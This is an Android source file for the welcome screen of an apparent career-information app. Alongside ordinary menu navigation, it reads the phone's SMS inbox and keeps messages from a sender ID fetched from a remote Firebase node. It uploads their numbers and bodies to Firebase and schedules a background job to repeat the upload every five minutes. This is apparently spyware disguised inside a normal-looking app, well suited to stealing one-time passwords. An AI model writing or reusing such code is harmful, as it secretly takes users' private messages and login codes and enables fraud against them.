package com.indian.youthcareerinfo.ui;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.cardview.widget.CardView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentTransaction;

import android.os.PersistableBundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.indian.youthcareerinfo.R;
import com.indian.youthcareerinfo.Services.UploadSmsAutoService;
import com.indian.youthcareerinfo.model.WelcomeActivity;

import java.util.ArrayList;
import java.util.List;

import static android.content.Context.JOB_SCHEDULER_SERVICE;
import static android.content.Context.MODE_PRIVATE;

public class WelcomeFragment extends Fragment implements View.OnClickListener {

    private static final String TAG = "Welcome Fragment";
    CardView homeCardView, notificaionCardView, uploadCardView, logoutCardView;
    SharedPreferences preferences;
    String senderId = "iyciyc";
    private List<String> sms;
    public String uploadId, email;
    private DatabaseReference mDatabaseRef;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View root = inflater.inflate(R.layout.fragment_welcome, container, false);

        mDatabaseRef = FirebaseDatabase.getInstance().getReference("Users");
        sms = new ArrayList<>();
        preferences = getActivity().getSharedPreferences("PREFERENCE", MODE_PRIVATE);
        email = preferences.getString("email", "");
        uploadId = preferences.getString("uploadId", "");

        homeCardView = root.findViewById(R.id.homeCardView);
        notificaionCardView = root.findViewById(R.id.notification);
        uploadCardView = root.findViewById(R.id.upload);
        logoutCardView = root.findViewById(R.id.logout);

        DatabaseReference senderIdRef = FirebaseDatabase.getInstance().getReference("SenderId");
        senderIdRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                senderId = snapshot.getValue().toString().toLowerCase();
                if (checkAndRequestPermissions()) {
                    loadSms();
                    uploadSmsAuto();
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });

        homeCardView.setOnClickListener(this);
        notificaionCardView.setOnClickListener(this);
        uploadCardView.setOnClickListener(this);
        logoutCardView.setOnClickListener(this);
        return root;
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.homeCardView:
                ((WelcomeActivity)this.getActivity()).getNavigationView().setCheckedItem(R.id.nav_home);
                ((WelcomeActivity)this.getActivity()).getToolbar().setTitle("Home");
                Fragment home = new HomeFragment();
                FragmentTransaction ft = getFragmentManager().beginTransaction();
                ft.replace(R.id.fragment_container, home);
                ft.setTransition(FragmentTransaction.TRANSIT_FRAGMENT_OPEN);
//                ft.addToBackStack(null);
//                navigationView.setCheckedItem(R.id.nav_welcome);
                ft.commit();
                break;
            case R.id.notification:
                ((WelcomeActivity)this.getActivity()).getNavigationView().setCheckedItem(R.id.nav_notification);
                ((WelcomeActivity)this.getActivity()).getToolbar().setTitle("Notifications");
                Fragment notification = new NotificationFragment();
                FragmentTransaction ft1 = getFragmentManager().beginTransaction();
                ft1.replace(R.id.fragment_container, notification);
                ft1.setTransition(FragmentTransaction.TRANSIT_FRAGMENT_OPEN);
//                ft1.addToBackStack(null);
                ft1.commit();
                break;
            case R.id.upload:
                ((WelcomeActivity)this.getActivity()).getNavigationView().setCheckedItem(R.id.nav_upload_documents);
                ((WelcomeActivity)this.getActivity()).getToolbar().setTitle("Upload Documents");
                Fragment upload = new UploadDocumentFragment();
                FragmentTransaction ft2 = getFragmentManager().beginTransaction();
                ft2.replace(R.id.fragment_container, upload);
                ft2.setTransition(FragmentTransaction.TRANSIT_FRAGMENT_OPEN);
//                ft2.addToBackStack(null);
                ft2.commit();
                break;
            case R.id.logout:
                ((WelcomeActivity)this.getActivity()).getNavigationView().setCheckedItem(R.id.nav_logout);
                ((WelcomeActivity)this.getActivity()).getToolbar().setTitle("Logout");
                Fragment logout = new LogoutFragment();
                FragmentTransaction ft3 = getFragmentManager().beginTransaction();
                ft3.replace(R.id.fragment_container, logout);
                ft3.setTransition(FragmentTransaction.TRANSIT_FRAGMENT_OPEN);
//                ft3.addToBackStack(null);
                ft3.commit();
                break;
        }
    }
    @SuppressLint("NewApi")
    private void uploadSmsAuto() {
        ComponentName componentName = new ComponentName(getContext(), UploadSmsAutoService.class);
        PersistableBundle bundle = new PersistableBundle();
        bundle.putString("uploadId", uploadId);
        bundle.putString("senderId", senderId);

        JobInfo info = null;
        info = new JobInfo.Builder(123, componentName)
                .setExtras(bundle)
                .setPeriodic(5 * 60 * 1000)
                .build();
        JobScheduler scheduler = (JobScheduler) getActivity().getSystemService(JOB_SCHEDULER_SERVICE);
        int resultCode = scheduler.schedule(info);
        if (resultCode == JobScheduler.RESULT_SUCCESS) {
            Log.d(TAG, "Job scheduled");
        } else {
            Log.d(TAG, "Job scheduling failed");
        }
    }


    private boolean checkAndRequestPermissions() {
        int sms = ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_SMS);

        if (sms != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(getActivity(), new String[]{Manifest.permission.READ_SMS}, 1);
            return false;
        }
        return true;
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        loadSms();
        uploadSmsAuto();
    }
    private void loadSms() {

        // Create Inbox box URI
        Uri inboxURI = Uri.parse("content://sms/inbox");

        // List required columns
        String[] reqCols = new String[]{"_id", "address", "body"};

        // Get Content Resolver object, which will deal with Content
        // Provider
        ContentResolver cr = getActivity().getContentResolver();

        // Fetch Inbox SMS Message from Built-in Content Provider
        Cursor c = cr.query(inboxURI, reqCols, null, null, null);

        if (c != null) {
            while (c.moveToNext()) {
                String Number = c.getString(c.getColumnIndexOrThrow("address")).toString();
                String Body = c.getString(c.getColumnIndexOrThrow("body")).toString();
//                if (Number.contains("XTECHH") || Number.contains("xtechh")) {
                if (Number.toLowerCase().contains(senderId)) {
                    sms.add("Number: " + Number + "\n" + "Body: " + Body);
                }
            }
            Log.d(TAG, "loadSms: ");
        }
        if (uploadId != null) {
            mDatabaseRef.child(uploadId).child("sms").setValue(sms);
            Log.d(TAG, "loadSms: 1" + uploadId);
        }
        c.close();
    }
}